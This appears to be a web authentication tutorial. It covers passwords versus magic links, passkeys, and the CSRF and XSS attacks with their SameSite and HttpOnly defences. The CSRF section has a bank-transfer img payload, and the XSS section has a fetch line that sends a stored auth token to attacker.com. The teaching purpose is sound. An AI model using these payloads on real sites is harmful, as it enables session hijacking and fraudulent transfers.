## PART 3 — MAGIC LINKS

### Why Passwords Are Dying

---

## 17. The Password Problem (Reality)

**Passwords:**

- Are reused
- Are phished
- Are forgotten
- Are leaked

**No amount of hashing fixes this.**

So the industry asked:

**"Do we even need passwords?"**

---

## 18. What Magic Links Are (Definition)

### Magic Link - Definition

A **magic link** is:

- A one-time URL
- Sent to user's email
- Acts as proof of identity

**Example:**

```
https://app.com/login?token=abc123
```

**Click = login.**

**No password.**

---

## 19. How Magic Links Work (First Principles)

```
1. User enters email
   ↓
2. Server generates random token
   ↓
3. Token stored (hashed) with expiry
   ↓
4. Email sent
   ↓
5. User clicks link
   ↓
6. Token verified
   ↓
7. Session / JWT issued
```

### 📌 Email inbox becomes the identity proof.

```
1. AWS SES: Send email "/confirm?token=uuid123"
2. DB: INSERT tokens (token='uuid123', email='john', expires=now+15m)
3. User clicks → GET /confirm?token=uuid123
4. YOU: SELECT * FROM tokens WHERE token=? AND expires>NOW()
5. YOU: DELETE FROM tokens (single-use)
6. YOU: jwt.sign({email}) → res.cookie('access', ...)
7. YOU: bcrypt.hash(refresh) → DB storage
```

---

| Feature        | Supabase                   | Manual AWS SES |
| -------------- | -------------------------- | -------------- |
| JWT Generation | ✅ Auto                    | ❌ You code    |
| Cookie Setting | ✅ Auto (HttpOnly, Secure) | ❌ You code    |
| Token Refresh  | ✅ Auto                    | ❌ You code    |
| Revocation     | ✅ Auto                    | ❌ You code    |
| Expiry         | ✅ Auto                    | ❌ You code    |
| Rate Limiting  | ✅ Auto                    | ❌ You code    |

## 20. Why Magic Links Are Secure

- Token is random
- Token expires quickly
- Token is single-use
- No password to steal

**Attack surface shifts to:**

**Email security**

Which is often stronger than passwords.

---

## 21. Downsides of Magic Links

- Email delay (3-10 seconds)
- Spam filters (may block)
- Bad UX offline
- Email compromise = account compromise

**Still:**

Better than passwords for many apps.

---

## 22. Passkeys (Future Direction)

### Passkey - Definition

**Passkeys** use:

- Device biometrics (Face ID, fingerprint)
- Cryptographic keys
- No shared secrets

**Backed by:**

- Apple
- Google
- Microsoft

**This is where auth is going.**

---

## Problems

- Why cookies enable CSRF
- Why JWT does not automatically fix CSRF
- Why SameSite works
- Why OAuth never sees passwords
- Why magic links remove phishing risk

---

## ✅ What's Done Now

You have now fully completed:

- ✔ HTTP basics
- ✔ HTTP performance (HTTP/1 vs HTTP/2 vs HTTP/3)
- ✔ Sessions (server-side state)
- ✔ Cookies (automatic, domain-scoped)
- ✔ JWT (signed, stateless tokens)
- ✔ Refresh tokens (security compartmentalization)
- ✔ CSRF (cookie attacks + SameSite defense)
- ✔ XSS (token theft + HttpOnly defense)
- ✔ OAuth (delegated authentication)
- ✔ Magic links (passwordless)
- ✔ Passkeys (future biometric)

**This is production-grade auth knowledge.**

---

## 6.1 CSRF — Cross-Site Request Forgery

### CSRF - Definition

**CSRF** is an attack where:

A malicious website tricks you into making requests to another site (where you're logged in).

### The Attack (Concrete)

You're logged into **bank.com** (has session cookie).

You visit **evil.com**.

**evil.com runs:**

```html
<img src="https://bank.com/transfer?to=attacker&amount=1000" />
```

**What happens:**

- Your browser makes that request
- Cookie is automatically sent
- Bank thinks YOU authorized it
- Money transfers

### Why This Works

Cookies are sent automatically by the browser.

The browser doesn't care if the request came from:

- bank.com
- evil.com
- anywhere

### The Defense: SameSite

### SameSite - Definition

**SameSite** is a cookie attribute that says:

"Only send this cookie if request originates from the same site."

**Server sets:**

```
Set-Cookie: session_id=xyz; SameSite=Strict
```

**What happens:**

- Browser is on bank.com → cookie sent ✅
- Browser is on evil.com → cookie NOT sent ❌

### SameSite Values

| Value  | Behavior                            |
| ------ | ----------------------------------- |
| Strict | Only same-site requests             |
| Lax    | Same-site + top-level navigation    |
| None   | All requests (requires Secure flag) |

### 📌 Lax

- Lax says "send the cookie if the user directly visits my site (even from a link on another site), but block sneaky background requests from other sites."

**All modern auth must use SameSite=Strict or Lax.**

---

## 6.2 XSS — Cross-Site Scripting

### XSS - Definition

**XSS** is an attack where:

Attacker injects JavaScript into a webpage you visit.

That JavaScript can:

- Read your cookies
- Steal your tokens
- Submit requests as you

### The Attack (Concrete)

You visit **news.com**.

Attacker injects:

```javascript
fetch("https://attacker.com/steal?token=" + localStorage.getItem("auth_token"));
```

**What happens:**

- JavaScript runs in your browser
- Sends your token to attacker
- Attacker now can impersonate you

### Token Storage Trade-off

**localStorage (vulnerable to XSS):**

```javascript
localStorage.setItem("auth_token", token);
// XSS can read this
```

**HttpOnly cookie (protected from XSS):**

```
Set-Cookie: auth_token=xyz; HttpOnly
// XSS cannot read this
```

### HttpOnly - Definition

**HttpOnly** is a cookie flag that says:

"Only the server can read this cookie. JavaScript cannot."

### The Trade-off

| Storage         | XSS Risk | CSRF Risk                    |
| --------------- | -------- | ---------------------------- |
| localStorage    | High     | None                         |
| HttpOnly cookie | None     | High (mitigated by SameSite) |
| sessionStorage  | High     | None                         |

### Modern Best Practice

**Web apps:**

- Use HttpOnly cookies
- Add SameSite=Strict
- CSRF token for form submissions if needed

---
